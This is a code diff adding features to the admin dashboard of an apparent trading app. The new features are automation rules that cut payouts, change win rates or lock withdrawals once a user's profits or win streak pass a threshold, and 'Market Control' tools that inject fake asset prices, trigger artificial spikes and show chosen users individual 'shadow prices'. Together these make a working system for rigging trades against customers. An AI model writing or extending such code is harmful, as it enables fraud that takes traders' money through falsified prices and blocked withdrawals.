@@ -30,12 +30,14 @@ const API_URL = process.env.EXPO_PUBLIC_BACKEND_URL
 const MENU_ITEMS = [
   { id: 'dashboard', label: 'Dashboard', icon: 'grid-outline', color: '#635BFF' },
   { id: 'god-mode', label: 'God Mode', icon: 'flash', color: '#FF3B30' },
+  { id: 'automation', label: 'Automation', icon: 'cog', color: '#FF9500' },
+  { id: 'market', label: 'Market Control', icon: 'pulse', color: '#AF52DE' },
   { id: 'users', label: 'Users', icon: 'people-outline', color: '#007AFF' },
   { id: 'trades', label: 'Live Trades', icon: 'trending-up', color: '#00D4AA' },
-  { id: 'affiliates', label: 'Affiliates', icon: 'git-network-outline', color: '#AF52DE' },
-  { id: 'withdrawals', label: 'Withdrawals', icon: 'wallet-outline', color: '#FF9500' },
+  { id: 'affiliates', label: 'Affiliates', icon: 'git-network-outline', color: '#5856D6' },
+  { id: 'withdrawals', label: 'Withdrawals', icon: 'wallet-outline', color: '#FF6B6B' },
   { id: 'deposits', label: 'Deposits', icon: 'card-outline', color: '#34C759' },
-  { id: 'assets', label: 'Assets', icon: 'cube-outline', color: '#5856D6' },
+  { id: 'assets', label: 'Assets', icon: 'cube-outline', color: '#8E8E93' },
   { id: 'roles', label: 'Roles', icon: 'shield-outline', color: '#FF2D55' },
 ];
 
@@ -148,6 +150,29 @@ export default function AdminDashboard() {
   const [deposits, setDeposits] = useState<any[]>([]);
   const [assets, setAssets] = useState<any[]>([]);
   const [godMode, setGodMode] = useState<any>(null);
+  
+  // Automation Engine
+  const [automationRules, setAutomationRules] = useState<any[]>([]);
+  const [showRuleModal, setShowRuleModal] = useState(false);
+  const [editingRule, setEditingRule] = useState<any>(null);
+  const [ruleForm, setRuleForm] = useState({
+    name: '',
+    description: '',
+    trigger_type: 'profit_threshold',
+    trigger_value: 500,
+    trigger_operator: 'gte',
+    action_type: 'adjust_payout',
+    action_value: 70,
+    priority: 0,
+    target_segment: 'all'
+  });
+  
+  // Market Control
+  const [marketStatus, setMarketStatus] = useState<any>(null);
+  const [showPriceModal, setShowPriceModal] = useState(false);
+  const [priceForm, setPriceForm] = useState({ asset: 'BTCUSD', price: 65000, duration: 60 });
+  const [spikeForm, setSpikeForm] = useState({ asset: 'BTCUSD', direction: 'up', percentage: 5 });
+  const [shadowForm, setShadowForm] = useState({ user_id: '', asset: 'BTCUSD', price: 0 });
   
   // User Management
   const [searchQuery, setSearchQuery] = useState('');
@@ -282,10 +307,26 @@ export default function AdminDashboard() {
     } catch (e) { console.error(e); }
   }, [token]);
 
+  // Automation Engine Fetching
+  const fetchAutomationRules = useCallback(async () => {
+    try {
+      const res = await fetch(`${API_URL}/admin/automation/rules`, { headers: { 'Authorization': `Bearer ${token}` } });
+      if (res.ok) setAutomationRules((await res.json()).rules || []);
+    } catch (e) { console.error(e); }
+  }, [token]);
+
+  // Market Control Fetching
+  const fetchMarketStatus = useCallback(async () => {
+    try {
+      const res = await fetch(`${API_URL}/admin/market/status`, { headers: { 'Authorization': `Bearer ${token}` } });
+      if (res.ok) setMarketStatus(await res.json());
+    } catch (e) { console.error(e); }
+  }, [token]);
+
   useEffect(() => {
     const init = async () => {
       setLoading(true);
-      await Promise.all([fetchDashboardStats(), fetchGodMode(), fetchUsers(), fetchUserSegments(), fetchAffiliates(), fetchTrades(), fetchAssets()]);
+      await Promise.all([fetchDashboardStats(), fetchGodMode(), fetchUsers(), fetchUserSegments(), fetchAffiliates(), fetchTrades(), fetchAssets(), fetchAutomationRules(), fetchMarketStatus()]);
       setLoading(false);
     };
     init();
@@ -422,9 +463,84 @@ export default function AdminDashboard() {
     fetchAssets();
   };
 
+  // ===== AUTOMATION ENGINE ACTIONS =====
+  const createRule = async () => {
+    await fetch(`${API_URL}/admin/automation/rules`, {
+      method: 'POST', headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
+      body: JSON.stringify(ruleForm)
+    });
+    Alert.alert('Success', 'Rule created');
+    setShowRuleModal(false);
+    setRuleForm({ name: '', description: '', trigger_type: 'profit_threshold', trigger_value: 500, trigger_operator: 'gte', action_type: 'adjust_payout', action_value: 70, priority: 0, target_segment: 'all' });
+    fetchAutomationRules();
+  };
+
+  const toggleRule = async (ruleId: string) => {
+    await fetch(`${API_URL}/admin/automation/rules/${ruleId}/toggle`, { method: 'POST', headers: { 'Authorization': `Bearer ${token}` } });
+    fetchAutomationRules();
+  };
+
+  const deleteRule = async (ruleId: string) => {
+    Alert.alert('Confirm', 'Delete this rule?', [
+      { text: 'Cancel' },
+      { text: 'Delete', style: 'destructive', onPress: async () => {
+        await fetch(`${API_URL}/admin/automation/rules/${ruleId}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` } });
+        fetchAutomationRules();
+      }}
+    ]);
+  };
+
+  const executeAllRules = async () => {
+    const res = await fetch(`${API_URL}/admin/automation/execute`, { method: 'POST', headers: { 'Authorization': `Bearer ${token}` } });
+    if (res.ok) {
+      const data = await res.json();
+      Alert.alert('Executed', `Affected ${data.results?.reduce((a: number, r: any) => a + r.affected_users, 0) || 0} users`);
+    }
+    fetchAutomationRules();
+  };
+
+  // ===== MARKET CONTROL ACTIONS =====
+  const injectPrice = async () => {
+    await fetch(`${API_URL}/admin/market/inject-price`, {
+      method: 'POST', headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
+      body: JSON.stringify({ asset: priceForm.asset, price: priceForm.price, duration_seconds: priceForm.duration })
+    });
+    Alert.alert('Success', `Price injected: ${priceForm.asset} = $${priceForm.price}`);
+    setShowPriceModal(false);
+    fetchMarketStatus();
+  };
+
+  const clearInjection = async (asset: string) => {
+    await fetch(`${API_URL}/admin/market/clear-injection?asset=${asset}`, { method: 'POST', headers: { 'Authorization': `Bearer ${token}` } });
+    Alert.alert('Cleared', `${asset} injection removed`);
+    fetchMarketStatus();
+  };
+
+  const triggerSpike = async () => {
+    await fetch(`${API_URL}/admin/market/price-spike`, {
+      method: 'POST', headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
+      body: JSON.stringify(spikeForm)
+    });
+    Alert.alert('Spike', `${spikeForm.asset} ${spikeForm.direction} ${spikeForm.percentage}%`);
+  };
+
+  const setShadowPrice = async () => {
+    if (!shadowForm.user_id) return Alert.alert('Error', 'Enter user ID');
+    await fetch(`${API_URL}/admin/market/shadow-price?user_id=${shadowForm.user_id}&asset=${shadowForm.asset}&price=${shadowForm.price}`, {
+      method: 'POST', headers: { 'Authorization': `Bearer ${token}` }
+    });
+    Alert.alert('Success', 'Shadow price set');
+    fetchMarketStatus();
+  };
+
+  const removeShadow = async (userId: string, asset: string) => {
+    await fetch(`${API_URL}/admin/market/shadow-price?user_id=${userId}&asset=${asset}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` } });
+    fetchMarketStatus();
+  };
+
   const onRefresh = async () => {
     setRefreshing(true);
-    await Promise.all([fetchDashboardStats(), fetchGodMode(), fetchUsers(), fetchUserSegments(), fetchAffiliates(), fetchTrades(), fetchAssets()]);
+    await Promise.all([fetchDashboardStats(), fetchGodMode(), fetchUsers(), fetchUserSegments(), fetchAffiliates(), fetchTrades(), fetchAssets(), fetchAutomationRules(), fetchMarketStatus()]);
     setRefreshing(false);
   };
 
@@ -551,6 +667,153 @@ export default function AdminDashboard() {
                   <TouchableOpacity style={styles.sliderBtn} onPress={() => setWinRateSlider(Math.min(200, winRateSlider + 5))}><Ionicons name="add" size={18} color="#FFF" /></TouchableOpacity>
                 </View>
                 <TouchableOpacity style={[styles.applyBtn, { backgroundColor: '#FF9500' }]} onPress={updateGlobalWinRate}><Text style={styles.applyText}>Apply</Text></TouchableOpacity>
+              </View>
+            </View>
+          )}
+
+          {/* AUTOMATION ENGINE */}
+          {activeMenu === 'automation' && (
+            <View style={styles.page}>
+              <View style={styles.sectionHeader}>
+                <Text style={styles.sectionTitle}>🤖 Automation Rules</Text>
+                <View style={styles.headerBtns}>
+                  <TouchableOpacity style={styles.executeBtn} onPress={executeAllRules}>
+                    <Ionicons name="play" size={16} color="#FFF" />
+                    <Text style={styles.executeBtnText}>Execute All</Text>
+                  </TouchableOpacity>
+                  <TouchableOpacity style={styles.addBtn} onPress={() => setShowRuleModal(true)}>
+                    <Ionicons name="add" size={20} color="#FFF" />
+                  </TouchableOpacity>
+                </View>
+              </View>
+              
+              {automationRules.length === 0 ? (
+                <View style={styles.empty}>
+                  <Ionicons name="cog-outline" size={48} color="#8898AA" />
+                  <Text style={styles.emptyText}>No automation rules</Text>
+                  <Text style={styles.emptySubtext}>Create rules to auto-manage users</Text>
+                </View>
+              ) : (
+                automationRules.map((rule) => (
+                  <View key={rule.rule_id} style={[styles.ruleCard, !rule.is_active && styles.ruleInactive]}>
+                    <View style={styles.ruleHeader}>
+                      <View style={styles.ruleInfo}>
+                        <Text style={styles.ruleName}>{rule.name}</Text>
+                        <Text style={styles.ruleDesc}>{rule.description || 'No description'}</Text>
+                      </View>
+                      <Switch value={rule.is_active} onValueChange={() => toggleRule(rule.rule_id)} trackColor={{ false: '#8E8E93', true: '#00D4AA' }} />
+                    </View>
+                    <View style={styles.ruleDetails}>
+                      <View style={styles.ruleTrigger}>
+                        <Text style={styles.ruleLabel}>TRIGGER</Text>
+                        <Text style={styles.ruleValue}>{rule.trigger_type.replace('_', ' ')} {rule.trigger_operator} {rule.trigger_value}</Text>
+                      </View>
+                      <Ionicons name="arrow-forward" size={16} color="#8898AA" />
+                      <View style={styles.ruleAction}>
+                        <Text style={styles.ruleLabel}>ACTION</Text>
+                        <Text style={styles.ruleValue}>{rule.action_type.replace('_', ' ')} {rule.action_value ? `(${rule.action_value}%)` : ''}</Text>
+                      </View>
+                    </View>
+                    <View style={styles.ruleMeta}>
+                      <Text style={styles.ruleMetaText}>Priority: {rule.priority}</Text>
+                      <Text style={styles.ruleMetaText}>Target: {rule.target_segment}</Text>
+                      <Text style={styles.ruleMetaText}>Executions: {rule.executions || 0}</Text>
+                      <TouchableOpacity onPress={() => deleteRule(rule.rule_id)}>
+                        <Ionicons name="trash-outline" size={18} color="#FF3B30" />
+                      </TouchableOpacity>
+                    </View>
+                  </View>
+                ))
+              )}
+            </View>
+          )}
+
+          {/* MARKET CONTROL */}
+          {activeMenu === 'market' && (
+            <View style={styles.page}>
+              <Text style={styles.sectionTitle}>💹 Market Control</Text>
+              
+              {/* Active Manipulations */}
+              <View style={styles.marketSection}>
+                <Text style={styles.marketSubtitle}>Active Price Injections ({marketStatus?.active_injections?.length || 0})</Text>
+                {marketStatus?.active_injections?.length > 0 ? (
+                  marketStatus.active_injections.map((inj: any, idx: number) => (
+                    <View key={idx} style={styles.injectionCard}>
+                      <View style={styles.injInfo}>
+                        <Text style={styles.injAsset}>{inj.asset}</Text>
+                        <Text style={styles.injPrice}>${inj.injected_price} (was ${inj.original_price})</Text>
+                      </View>
+                      <TouchableOpacity style={styles.clearBtn} onPress={() => clearInjection(inj.asset)}>
+                        <Ionicons name="close" size={18} color="#FF3B30" />
+                      </TouchableOpacity>
+                    </View>
+                  ))
+                ) : (
+                  <Text style={styles.noData}>No active injections</Text>
+                )}
+              </View>
+
+              {/* Price Injection Form */}
+              <View style={styles.marketSection}>
+                <Text style={styles.marketSubtitle}>Inject Price</Text>
+                <View style={styles.formRow}>
+                  <TextInput style={[styles.formInput, { flex: 1 }]} placeholder="Asset (e.g. BTCUSD)" value={priceForm.asset} onChangeText={(t) => setPriceForm({...priceForm, asset: t})} />
+                  <TextInput style={[styles.formInput, { flex: 1 }]} placeholder="Price" keyboardType="numeric" value={String(priceForm.price)} onChangeText={(t) => setPriceForm({...priceForm, price: parseFloat(t) || 0})} />
+                </View>
+                <View style={styles.formRow}>
+                  <TextInput style={[styles.formInput, { flex: 1 }]} placeholder="Duration (sec)" keyboardType="numeric" value={String(priceForm.duration)} onChangeText={(t) => setPriceForm({...priceForm, duration: parseInt(t) || 60})} />
+                  <TouchableOpacity style={styles.injectBtn} onPress={injectPrice}>
+                    <Text style={styles.injectBtnText}>INJECT</Text>
+                  </TouchableOpacity>
+                </View>
+              </View>
+
+              {/* Price Spike */}
+              <View style={styles.marketSection}>
+                <Text style={styles.marketSubtitle}>Trigger Price Spike</Text>
+                <View style={styles.formRow}>
+                  <TextInput style={[styles.formInput, { flex: 1 }]} placeholder="Asset" value={spikeForm.asset} onChangeText={(t) => setSpikeForm({...spikeForm, asset: t})} />
+                  <TouchableOpacity style={[styles.dirBtn, spikeForm.direction === 'up' && styles.dirBtnActive]} onPress={() => setSpikeForm({...spikeForm, direction: 'up'})}>
+                    <Ionicons name="trending-up" size={18} color={spikeForm.direction === 'up' ? '#FFF' : '#00D4AA'} />
+                  </TouchableOpacity>
+                  <TouchableOpacity style={[styles.dirBtn, spikeForm.direction === 'down' && styles.dirBtnActiveDown]} onPress={() => setSpikeForm({...spikeForm, direction: 'down'})}>
+                    <Ionicons name="trending-down" size={18} color={spikeForm.direction === 'down' ? '#FFF' : '#FF3B30'} />
+                  </TouchableOpacity>
+                </View>
+                <View style={styles.formRow}>
+                  <TextInput style={[styles.formInput, { flex: 1 }]} placeholder="Percentage" keyboardType="numeric" value={String(spikeForm.percentage)} onChangeText={(t) => setSpikeForm({...spikeForm, percentage: parseFloat(t) || 5})} />
+                  <TouchableOpacity style={styles.spikeBtn} onPress={triggerSpike}>
+                    <Text style={styles.spikeBtnText}>SPIKE</Text>
+                  </TouchableOpacity>
+                </View>
+              </View>
+
+              {/* Shadow Prices */}
+              <View style={styles.marketSection}>
+                <Text style={styles.marketSubtitle}>Shadow Prices ({marketStatus?.shadow_prices?.length || 0})</Text>
+                {marketStatus?.shadow_prices?.length > 0 && (
+                  marketStatus.shadow_prices.map((s: any, idx: number) => (
+                    <View key={idx} style={styles.shadowCard}>
+                      <View style={styles.shadowInfo}>
+                        <Text style={styles.shadowEmail}>{s.user_email}</Text>
+                        <Text style={styles.shadowPrice}>{s.asset}: ${s.shadow_price} (market: ${s.market_price})</Text>
+                      </View>
+                      <TouchableOpacity onPress={() => removeShadow(s.user_id, s.asset)}>
+                        <Ionicons name="close-circle" size={20} color="#FF3B30" />
+                      </TouchableOpacity>
+                    </View>
+                  ))
+                )}
+                <View style={styles.formRow}>
+                  <TextInput style={[styles.formInput, { flex: 1 }]} placeholder="User ID" value={shadowForm.user_id} onChangeText={(t) => setShadowForm({...shadowForm, user_id: t})} />
+                </View>
+                <View style={styles.formRow}>
+                  <TextInput style={[styles.formInput, { flex: 1 }]} placeholder="Asset" value={shadowForm.asset} onChangeText={(t) => setShadowForm({...shadowForm, asset: t})} />
+                  <TextInput style={[styles.formInput, { flex: 1 }]} placeholder="Price" keyboardType="numeric" value={String(shadowForm.price)} onChangeText={(t) => setShadowForm({...shadowForm, price: parseFloat(t) || 0})} />
+                </View>
+                <TouchableOpacity style={styles.shadowBtn} onPress={setShadowPrice}>
+                  <Text style={styles.shadowBtnText}>SET SHADOW PRICE</Text>
+                </TouchableOpacity>
               </View>
             </View>
           )}
@@ -850,6 +1113,88 @@ export default function AdminDashboard() {
           </View>
         </View>
       </Modal>
+
+      {/* Rule Creation Modal */}
+      <Modal visible={showRuleModal} transparent animationType="slide">
+        <View style={styles.modalOverlay}>
+          <View style={[styles.modalContent, { maxWidth: 500 }]}>
+            <View style={styles.modalHeader}>
+              <Text style={styles.modalTitle}>Create Automation Rule</Text>
+              <TouchableOpacity onPress={() => setShowRuleModal(false)}><Ionicons name="close" size={24} color="#8898AA" /></TouchableOpacity>
+            </View>
+            <ScrollView style={styles.modalScroll}>
+              <Text style={styles.formLabel}>Rule Name</Text>
+              <TextInput style={styles.ruleInput} placeholder="e.g. High Profit Reducer" value={ruleForm.name} onChangeText={(t) => setRuleForm({...ruleForm, name: t})} />
+              
+              <Text style={styles.formLabel}>Description</Text>
+              <TextInput style={[styles.ruleInput, { minHeight: 60 }]} placeholder="What does this rule do?" multiline value={ruleForm.description} onChangeText={(t) => setRuleForm({...ruleForm, description: t})} />
+              
+              <Text style={styles.formLabel}>Trigger Type</Text>
+              <View style={styles.triggerBtns}>
+                {['profit_threshold', 'win_streak', 'deposit_amount', 'loss_streak'].map((t) => (
+                  <TouchableOpacity key={t} style={[styles.triggerBtn, ruleForm.trigger_type === t && styles.triggerBtnActive]} onPress={() => setRuleForm({...ruleForm, trigger_type: t})}>
+                    <Text style={[styles.triggerBtnText, ruleForm.trigger_type === t && { color: '#FFF' }]}>{t.replace('_', ' ')}</Text>
+                  </TouchableOpacity>
+                ))}
+              </View>
+              
+              <View style={styles.triggerRow}>
+                <View style={{ flex: 1 }}>
+                  <Text style={styles.formLabel}>Operator</Text>
+                  <View style={styles.opBtns}>
+                    {[{id: 'gte', label: '>='}, {id: 'lte', label: '<='}, {id: 'eq', label: '='}].map((o) => (
+                      <TouchableOpacity key={o.id} style={[styles.opBtn, ruleForm.trigger_operator === o.id && styles.opBtnActive]} onPress={() => setRuleForm({...ruleForm, trigger_operator: o.id})}>
+                        <Text style={[styles.opBtnText, ruleForm.trigger_operator === o.id && { color: '#FFF' }]}>{o.label}</Text>
+                      </TouchableOpacity>
+                    ))}
+                  </View>
+                </View>
+                <View style={{ flex: 1, marginLeft: 12 }}>
+                  <Text style={styles.formLabel}>Value</Text>
+                  <TextInput style={styles.ruleInput} placeholder="500" keyboardType="numeric" value={String(ruleForm.trigger_value)} onChangeText={(t) => setRuleForm({...ruleForm, trigger_value: parseFloat(t) || 0})} />
+                </View>
+              </View>
+              
+              <Text style={styles.formLabel}>Action Type</Text>
+              <View style={styles.actionBtns}>
+                {['adjust_payout', 'adjust_winrate', 'flag_user', 'suspend_user', 'shadow_ban', 'lock_withdrawals'].map((a) => (
+                  <TouchableOpacity key={a} style={[styles.actionBtn, ruleForm.action_type === a && styles.actionBtnActive]} onPress={() => setRuleForm({...ruleForm, action_type: a})}>
+                    <Text style={[styles.actionBtnText, ruleForm.action_type === a && { color: '#FFF' }]}>{a.replace('_', ' ')}</Text>
+                  </TouchableOpacity>
+                ))}
+              </View>
+              
+              {(ruleForm.action_type === 'adjust_payout' || ruleForm.action_type === 'adjust_winrate') && (
+                <View>
+                  <Text style={styles.formLabel}>Action Value (%)</Text>
+                  <TextInput style={styles.ruleInput} placeholder="70" keyboardType="numeric" value={String(ruleForm.action_value)} onChangeText={(t) => setRuleForm({...ruleForm, action_value: parseFloat(t) || 0})} />
+                </View>
+              )}
+              
+              <View style={styles.triggerRow}>
+                <View style={{ flex: 1 }}>
+                  <Text style={styles.formLabel}>Priority</Text>
+                  <TextInput style={styles.ruleInput} placeholder="0" keyboardType="numeric" value={String(ruleForm.priority)} onChangeText={(t) => setRuleForm({...ruleForm, priority: parseInt(t) || 0})} />
+                </View>
+                <View style={{ flex: 1, marginLeft: 12 }}>
+                  <Text style={styles.formLabel}>Target Segment</Text>
+                  <View style={styles.segmentBtns}>
+                    {['all', 'vip', 'new_users'].map((s) => (
+                      <TouchableOpacity key={s} style={[styles.segBtn, ruleForm.target_segment === s && styles.segBtnActive]} onPress={() => setRuleForm({...ruleForm, target_segment: s})}>
+                        <Text style={[styles.segBtnText, ruleForm.target_segment === s && { color: '#FFF' }]}>{s}</Text>
+                      </TouchableOpacity>
+                    ))}
+                  </View>
+                </View>
+              </View>
+              
+              <TouchableOpacity style={styles.createRuleBtn} onPress={createRule}>
+                <Text style={styles.createRuleBtnText}>CREATE RULE</Text>
+              </TouchableOpacity>
+            </ScrollView>
+          </View>
+        </View>
+      </Modal>
     </View>
   );
 }
@@ -1045,4 +1390,73 @@ const styles = StyleSheet.create({
   noteText: { fontSize: 12, color: '#1A1F36' },
   logoutBtn: { backgroundColor: '#FF3B30', paddingVertical: 12, borderRadius: 8, alignItems: 'center', marginTop: 16 },
   logoutBtnText: { color: '#FFF', fontSize: 13, fontWeight: '700' },
+  
+  // Automation Engine Styles
+  sectionHeader: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginBottom: 16 },
+  sectionTitle: { fontSize: 16, fontWeight: '700', color: '#1A1F36' },
+  headerBtns: { flexDirection: 'row', alignItems: 'center' },
+  executeBtn: { flexDirection: 'row', alignItems: 'center', backgroundColor: '#FF9500', paddingVertical: 8, paddingHorizontal: 12, borderRadius: 8, marginRight: 8 },
+  executeBtnText: { color: '#FFF', fontSize: 12, fontWeight: '600', marginLeft: 4 },
+  addBtn: { backgroundColor: '#635BFF', width: 36, height: 36, borderRadius: 18, justifyContent: 'center', alignItems: 'center' },
+  ruleCard: { backgroundColor: '#FFF', borderRadius: 12, padding: 16, marginBottom: 12, borderLeftWidth: 4, borderLeftColor: '#00D4AA' },
+  ruleInactive: { borderLeftColor: '#8E8E93', opacity: 0.7 },
+  ruleHeader: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'flex-start' },
+  ruleInfo: { flex: 1 },
+  ruleName: { fontSize: 15, fontWeight: '700', color: '#1A1F36' },
+  ruleDesc: { fontSize: 12, color: '#8898AA', marginTop: 2 },
+  ruleDetails: { flexDirection: 'row', alignItems: 'center', marginTop: 12, backgroundColor: '#F6F9FC', padding: 12, borderRadius: 8 },
+  ruleTrigger: { flex: 1 },
+  ruleAction: { flex: 1 },
+  ruleLabel: { fontSize: 9, fontWeight: '700', color: '#8898AA', marginBottom: 2 },
+  ruleValue: { fontSize: 12, fontWeight: '600', color: '#1A1F36', textTransform: 'capitalize' },
+  ruleMeta: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginTop: 12, paddingTop: 12, borderTopWidth: 1, borderTopColor: '#E6EBF1' },
+  ruleMetaText: { fontSize: 11, color: '#8898AA' },
+  
+  // Market Control Styles
+  marketSection: { backgroundColor: '#FFF', borderRadius: 12, padding: 16, marginBottom: 12 },
+  marketSubtitle: { fontSize: 14, fontWeight: '600', color: '#1A1F36', marginBottom: 12 },
+  injectionCard: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', backgroundColor: '#FFF3E0', padding: 12, borderRadius: 8, marginBottom: 8 },
+  injInfo: { flex: 1 },
+  injAsset: { fontSize: 14, fontWeight: '700', color: '#1A1F36' },
+  injPrice: { fontSize: 12, color: '#8898AA' },
+  clearBtn: { padding: 8 },
+  noData: { fontSize: 12, color: '#8898AA', fontStyle: 'italic' },
+  formRow: { flexDirection: 'row', marginBottom: 8 },
+  formInput: { backgroundColor: '#F6F9FC', borderRadius: 8, paddingVertical: 10, paddingHorizontal: 12, fontSize: 13, marginRight: 8 },
+  injectBtn: { backgroundColor: '#AF52DE', paddingVertical: 10, paddingHorizontal: 20, borderRadius: 8, justifyContent: 'center' },
+  injectBtnText: { color: '#FFF', fontSize: 12, fontWeight: '700' },
+  dirBtn: { width: 40, height: 40, borderRadius: 8, backgroundColor: '#F6F9FC', justifyContent: 'center', alignItems: 'center', marginLeft: 8 },
+  dirBtnActive: { backgroundColor: '#00D4AA' },
+  dirBtnActiveDown: { backgroundColor: '#FF3B30' },
+  spikeBtn: { backgroundColor: '#FF6B6B', paddingVertical: 10, paddingHorizontal: 20, borderRadius: 8, justifyContent: 'center' },
+  spikeBtnText: { color: '#FFF', fontSize: 12, fontWeight: '700' },
+  shadowCard: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', backgroundColor: '#F3E5F5', padding: 12, borderRadius: 8, marginBottom: 8 },
+  shadowInfo: { flex: 1 },
+  shadowEmail: { fontSize: 13, fontWeight: '600', color: '#1A1F36' },
+  shadowPrice: { fontSize: 11, color: '#8898AA' },
+  shadowBtn: { backgroundColor: '#9C27B0', paddingVertical: 12, borderRadius: 8, alignItems: 'center', marginTop: 8 },
+  shadowBtnText: { color: '#FFF', fontSize: 13, fontWeight: '700' },
+  
+  // Rule Modal Styles
+  ruleInput: { backgroundColor: '#F6F9FC', borderRadius: 8, paddingVertical: 12, paddingHorizontal: 14, fontSize: 14, marginBottom: 12 },
+  formLabel: { fontSize: 12, fontWeight: '600', color: '#1A1F36', marginBottom: 6, marginTop: 4 },
+  triggerBtns: { flexDirection: 'row', flexWrap: 'wrap', marginBottom: 12 },
+  triggerBtn: { paddingVertical: 8, paddingHorizontal: 12, backgroundColor: '#F6F9FC', borderRadius: 8, marginRight: 8, marginBottom: 8 },
+  triggerBtnActive: { backgroundColor: '#FF9500' },
+  triggerBtnText: { fontSize: 11, fontWeight: '600', color: '#8898AA', textTransform: 'capitalize' },
+  triggerRow: { flexDirection: 'row', marginBottom: 12 },
+  opBtns: { flexDirection: 'row' },
+  opBtn: { paddingVertical: 8, paddingHorizontal: 14, backgroundColor: '#F6F9FC', borderRadius: 8, marginRight: 6 },
+  opBtnActive: { backgroundColor: '#635BFF' },
+  opBtnText: { fontSize: 14, fontWeight: '700', color: '#8898AA' },
+  actionBtns: { flexDirection: 'row', flexWrap: 'wrap', marginBottom: 12 },
+  actionBtn: { paddingVertical: 8, paddingHorizontal: 12, backgroundColor: '#F6F9FC', borderRadius: 8, marginRight: 8, marginBottom: 8 },
+  actionBtnActive: { backgroundColor: '#FF3B30' },
+  actionBtnText: { fontSize: 11, fontWeight: '600', color: '#8898AA', textTransform: 'capitalize' },
+  segmentBtns: { flexDirection: 'row' },
+  segBtn: { paddingVertical: 6, paddingHorizontal: 10, backgroundColor: '#F6F9FC', borderRadius: 6, marginRight: 6 },
+  segBtnActive: { backgroundColor: '#007AFF' },
+  segBtnText: { fontSize: 10, fontWeight: '600', color: '#8898AA', textTransform: 'capitalize' },
+  createRuleBtn: { backgroundColor: '#00D4AA', paddingVertical: 14, borderRadius: 10, alignItems: 'center', marginTop: 12, marginBottom: 20 },
+  createRuleBtnText: { color: '#FFF', fontSize: 14, fontWeight: '700' },
 });
